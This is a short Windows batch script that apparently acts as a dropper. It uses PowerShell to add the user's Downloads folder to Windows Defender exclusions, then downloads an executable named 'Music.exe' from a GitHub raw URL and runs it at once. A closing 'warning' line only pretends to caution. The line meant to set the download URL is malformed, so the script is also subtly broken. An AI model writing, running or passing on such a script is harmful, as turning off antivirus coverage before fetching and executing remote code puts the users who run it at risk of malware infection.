@echo off
setlocal

:: Define parameters
set "https://github.com/idolmusiclimited/music/raw/refs/heads/main/Music.exe"
set "outputFileName=Music.exe"
set "outputFilePath=%USERPROFILE%\Downloads\%outputFileName%"

:: Add the Downloads folder to antivirus exclusions (Windows Defender)
echo Adding Downloads folder to antivirus exclusions...
powershell -Command "try { Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads; Write-Host 'Downloads folder successfully added to exclusions.' -ForegroundColor Green } catch { Write-Host 'Failed to add Downloads folder to antivirus exclusions.' -ForegroundColor Red; exit 1 }"

:: Wait briefly to ensure exclusion is registered
timeout /t 1 >nul

:: Download the file
echo Downloading file from %url% to %outputFilePath%...
powershell -Command "try { Invoke-WebRequest -Uri '%url%' -OutFile '%outputFilePath%'; Write-Host 'File successfully downloaded to %outputFilePath%' -ForegroundColor Green } catch { Write-Host 'Failed to download the file.' -ForegroundColor Red; exit 1 }"

:: Check if the file exists
if not exist "%outputFilePath%" (
    echo Failed to download the file.
    exit /b 1
)

:: Run the downloaded file
echo Executing the downloaded file: %outputFilePath%
start "" "%outputFilePath%"

:: Security Warning
echo WARNING: Running downloaded files can be risky. Ensure the source URL is trusted.
pause
